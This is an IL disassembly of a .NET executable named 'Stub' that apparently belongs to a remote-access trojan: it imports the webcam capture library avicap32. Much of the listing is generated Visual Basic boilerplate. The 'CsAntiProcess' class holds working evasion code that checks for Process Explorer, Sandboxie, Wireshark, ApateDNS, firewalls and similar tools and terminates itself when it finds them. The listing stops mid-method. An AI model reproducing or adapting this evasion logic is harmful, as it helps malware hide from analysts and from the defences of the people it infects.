
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern avicap32.dll
.module extern user32.dll
.module extern kernel32
.module extern ntdll
.module extern user32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly Stub
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module Stub.exe
// MVID: {A5398F30-B336-4AB2-9C58-E633643CD459}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00690000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0007:  nop
    IL_0008:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       18 (0x12)
      .maxstack  2
      .locals init ([0] bool Equals)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  ldarg.1
      IL_0003:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0008:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0010

      IL_0010:  ldloc.0
      IL_0011:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init ([0] int32 GetHashCode)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  1
      .locals init ([0] class [mscorlib]System.Type GetType)
      IL_0000:  nop
      IL_0001:  ldtoken    My.MyProject/MyWebServices
      IL_0006:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000b:  stloc.0
      IL_000c:  br.s       IL_000e

      IL_000e:  ldloc.0
      IL_000f:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       12 (0xc)
      .maxstack  1
      .locals init ([0] string ToString)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance string [mscorlib]System.Object::ToString()
      IL_0007:  stloc.0
      IL_0008:  br.s       IL_000a

      IL_000a:  ldloc.0
      IL_000b:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       29 (0x1d)
      .maxstack  2
      .locals init ([0] !!T Create__Instance__,
               [1] bool V_1)
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  box        !!T
      IL_0007:  ldnull
      IL_0008:  ceq
      IL_000a:  stloc.1
      IL_000b:  ldloc.1
      IL_000c:  brfalse.s  IL_0016

      IL_000e:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_0013:  stloc.0
      IL_0014:  br.s       IL_001b

      IL_0016:  nop
      IL_0017:  ldarg.0
      IL_0018:  stloc.0
      IL_0019:  br.s       IL_001b

      IL_001b:  ldloc.0
      IL_001c:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       9 (0x9)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.1
      IL_0002:  initobj    !!T
      IL_0008:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       9 (0x9)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       38 (0x26)
      .maxstack  2
      .locals init ([0] !T GetInstance,
               [1] bool V_1)
      IL_0000:  nop
      IL_0001:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0006:  box        !T
      IL_000b:  ldnull
      IL_000c:  ceq
      IL_000e:  stloc.1
      IL_000f:  ldloc.1
      IL_0010:  brfalse.s  IL_001c

      IL_0012:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0017:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001c:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0021:  stloc.0
      IL_0022:  br.s       IL_0024

      IL_0024:  ldloc.0
      IL_0025:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       9 (0x9)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  ldarg.0
      IL_0002:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0007:  nop
      IL_0008:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] class My.MyComputer Computer)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] class My.MyApplication Application)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User User)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       16 (0x10)
    .maxstack  1
    .locals init ([0] class My.MyProject/MyWebServices WebServices)
    IL_0000:  nop
    IL_0001:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0006:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000b:  stloc.0
    IL_000c:  br.s       IL_000e

    IL_000e:  ldloc.0
    IL_000f:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class public auto ansi beforefieldinit Stub.CsAntiProcess
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .field private static class j.OK N
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  newobj     instance void j.OK::.ctor()
    IL_0005:  stsfld     class j.OK Stub.CsAntiProcess::N
    IL_000a:  ret
  } // end of method CsAntiProcess::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method CsAntiProcess::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed noinlining nooptimization
  {
    // Code size       916 (0x394)
    .maxstack  2
    .locals init ([0] class [System]System.Diagnostics.Process process,
             [1] class [System]System.Diagnostics.Process process2,
             [2] class [System]System.Diagnostics.Process process3,
             [3] class [System]System.Diagnostics.Process process4,
             [4] class [System]System.Diagnostics.Process process5,
             [5] class [System]System.Diagnostics.Process process6,
             [6] class [System]System.Diagnostics.Process process7,
             [7] class [System]System.Diagnostics.Process process8,
             [8] class [System]System.Diagnostics.Process process9,
             [9] class [System]System.Diagnostics.Process process10,
             [10] class [System]System.Diagnostics.Process process11,
             [11] class [System]System.Diagnostics.Process process12,
             [12] class [System]System.Diagnostics.Process process15,
             [13] class [System]System.Diagnostics.Process process16,
             [14] class [System]System.Diagnostics.Process process17,
             [15] class [System]System.Diagnostics.Process process18,
             [16] class [System]System.Diagnostics.Process process19,
             [17] class [System]System.Diagnostics.Process process20,
             [18] class [System]System.Diagnostics.Process[] V_18,
             [19] int32 V_19,
             [20] bool V_20,
             [21] class [System]System.Diagnostics.Process[] V_21,
             [22] int32 V_22,
             [23] bool V_23,
             [24] class [System]System.Diagnostics.Process[] V_24,
             [25] int32 V_25,
             [26] bool V_26,
             [27] class [System]System.Diagnostics.Process[] V_27,
             [28] int32 V_28,
             [29] bool V_29,
             [30] class [System]System.Diagnostics.Process[] V_30,
             [31] int32 V_31,
             [32] bool V_32,
             [33] class [System]System.Diagnostics.Process[] V_33,
             [34] int32 V_34,
             [35] bool V_35,
             [36] class [System]System.Diagnostics.Process[] V_36,
             [37] int32 V_37,
             [38] bool V_38,
             [39] class [System]System.Diagnostics.Process[] V_39,
             [40] int32 V_40,
             [41] bool V_41,
             [42] class [System]System.Diagnostics.Process[] V_42,
             [43] int32 V_43,
             [44] bool V_44,
             [45] class [System]System.Diagnostics.Process[] V_45,
             [46] int32 V_46,
             [47] bool V_47,
             [48] class [System]System.Diagnostics.Process[] V_48,
             [49] int32 V_49,
             [50] bool V_50,
             [51] class [System]System.Diagnostics.Process[] V_51,
             [52] int32 V_52,
             [53] bool V_53,
             [54] class [System]System.Diagnostics.Process[] V_54,
             [55] int32 V_55,
             [56] bool V_56,
             [57] class [System]System.Diagnostics.Process[] V_57,
             [58] int32 V_58,
             [59] bool V_59,
             [60] class [System]System.Diagnostics.Process[] V_60,
             [61] int32 V_61,
             [62] bool V_62,
             [63] class [System]System.Diagnostics.Process[] V_63,
             [64] int32 V_64,
             [65] bool V_65,
             [66] class [System]System.Diagnostics.Process[] V_66,
             [67] int32 V_67,
             [68] bool V_68,
             [69] class [System]System.Diagnostics.Process[] V_69,
             [70] int32 V_70,
             [71] bool V_71)
    IL_0000:  nop
    IL_0001:  ldstr      "procexp"
    IL_0006:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000b:  stloc.s    V_18
    IL_000d:  ldc.i4.0
    IL_000e:  stloc.s    V_19
    IL_0010:  br.s       IL_0025

    IL_0012:  ldloc.s    V_18
    IL_0014:  ldloc.s    V_19
    IL_0016:  ldelem.ref
    IL_0017:  stloc.0
    IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_001d:  nop
    IL_001e:  nop
    IL_001f:  ldloc.s    V_19
    IL_0021:  ldc.i4.1
    IL_0022:  add.ovf
    IL_0023:  stloc.s    V_19
    IL_0025:  ldloc.s    V_19
    IL_0027:  ldloc.s    V_18
    IL_0029:  ldlen
    IL_002a:  conv.i4
    IL_002b:  clt
    IL_002d:  stloc.s    V_20
    IL_002f:  ldloc.s    V_20
    IL_0031:  brtrue.s   IL_0012

    IL_0033:  ldstr      "SbieCtrl"
    IL_0038:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_003d:  stloc.s    V_21
    IL_003f:  ldc.i4.0
    IL_0040:  stloc.s    V_22
    IL_0042:  br.s       IL_0057

    IL_0044:  ldloc.s    V_21
    IL_0046:  ldloc.s    V_22
    IL_0048:  ldelem.ref
    IL_0049:  stloc.1
    IL_004a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_004f:  nop
    IL_0050:  nop
    IL_0051:  ldloc.s    V_22
    IL_0053:  ldc.i4.1
    IL_0054:  add.ovf
    IL_0055:  stloc.s    V_22
    IL_0057:  ldloc.s    V_22
    IL_0059:  ldloc.s    V_21
    IL_005b:  ldlen
    IL_005c:  conv.i4
    IL_005d:  clt
    IL_005f:  stloc.s    V_23
    IL_0061:  ldloc.s    V_23
    IL_0063:  brtrue.s   IL_0044

    IL_0065:  ldstr      "SpyTheSpy"
    IL_006a:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_006f:  stloc.s    V_24
    IL_0071:  ldc.i4.0
    IL_0072:  stloc.s    V_25
    IL_0074:  br.s       IL_0089

    IL_0076:  ldloc.s    V_24
    IL_0078:  ldloc.s    V_25
    IL_007a:  ldelem.ref
    IL_007b:  stloc.2
    IL_007c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0081:  nop
    IL_0082:  nop
    IL_0083:  ldloc.s    V_25
    IL_0085:  ldc.i4.1
    IL_0086:  add.ovf
    IL_0087:  stloc.s    V_25
    IL_0089:  ldloc.s    V_25
    IL_008b:  ldloc.s    V_24
    IL_008d:  ldlen
    IL_008e:  conv.i4
    IL_008f:  clt
    IL_0091:  stloc.s    V_26
    IL_0093:  ldloc.s    V_26
    IL_0095:  brtrue.s   IL_0076

    IL_0097:  ldstr      "wireshark"
    IL_009c:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a1:  stloc.s    V_27
    IL_00a3:  ldc.i4.0
    IL_00a4:  stloc.s    V_28
    IL_00a6:  br.s       IL_00bb

    IL_00a8:  ldloc.s    V_27
    IL_00aa:  ldloc.s    V_28
    IL_00ac:  ldelem.ref
    IL_00ad:  stloc.3
    IL_00ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00b3:  nop
    IL_00b4:  nop
    IL_00b5:  ldloc.s    V_28
    IL_00b7:  ldc.i4.1
    IL_00b8:  add.ovf
    IL_00b9:  stloc.s    V_28
    IL_00bb:  ldloc.s    V_28
    IL_00bd:  ldloc.s    V_27
    IL_00bf:  ldlen
    IL_00c0:  conv.i4
    IL_00c1:  clt
    IL_00c3:  stloc.s    V_29
    IL_00c5:  ldloc.s    V_29
    IL_00c7:  brtrue.s   IL_00a8

    IL_00c9:  ldstr      "apateDNS"
    IL_00ce:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00d3:  stloc.s    V_30
    IL_00d5:  ldc.i4.0
    IL_00d6:  stloc.s    V_31
    IL_00d8:  br.s       IL_00ee

    IL_00da:  ldloc.s    V_30
    IL_00dc:  ldloc.s    V_31
    IL_00de:  ldelem.ref
    IL_00df:  stloc.s    process5
    IL_00e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00e6:  nop
    IL_00e7:  nop
    IL_00e8:  ldloc.s    V_31
    IL_00ea:  ldc.i4.1
    IL_00eb:  add.ovf
    IL_00ec:  stloc.s    V_31
    IL_00ee:  ldloc.s    V_31
    IL_00f0:  ldloc.s    V_30
    IL_00f2:  ldlen
    IL_00f3:  conv.i4
    IL_00f4:  clt
    IL_00f6:  stloc.s    V_32
    IL_00f8:  ldloc.s    V_32
    IL_00fa:  brtrue.s   IL_00da

    IL_00fc:  ldstr      "IPBlocker"
    IL_0101:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0106:  stloc.s    V_33
    IL_0108:  ldc.i4.0
    IL_0109:  stloc.s    V_34
    IL_010b:  br.s       IL_0121

    IL_010d:  ldloc.s    V_33
    IL_010f:  ldloc.s    V_34
    IL_0111:  ldelem.ref
    IL_0112:  stloc.s    process6
    IL_0114:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0119:  nop
    IL_011a:  nop
    IL_011b:  ldloc.s    V_34
    IL_011d:  ldc.i4.1
    IL_011e:  add.ovf
    IL_011f:  stloc.s    V_34
    IL_0121:  ldloc.s    V_34
    IL_0123:  ldloc.s    V_33
    IL_0125:  ldlen
    IL_0126:  conv.i4
    IL_0127:  clt
    IL_0129:  stloc.s    V_35
    IL_012b:  ldloc.s    V_35
    IL_012d:  brtrue.s   IL_010d

    IL_012f:  ldstr      "TiGeR-Firewall"
    IL_0134:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0139:  stloc.s    V_36
    IL_013b:  ldc.i4.0
    IL_013c:  stloc.s    V_37
    IL_013e:  br.s       IL_0154

    IL_0140:  ldloc.s    V_36
    IL_0142:  ldloc.s    V_37
    IL_0144:  ldelem.ref
    IL_0145:  stloc.s    process7
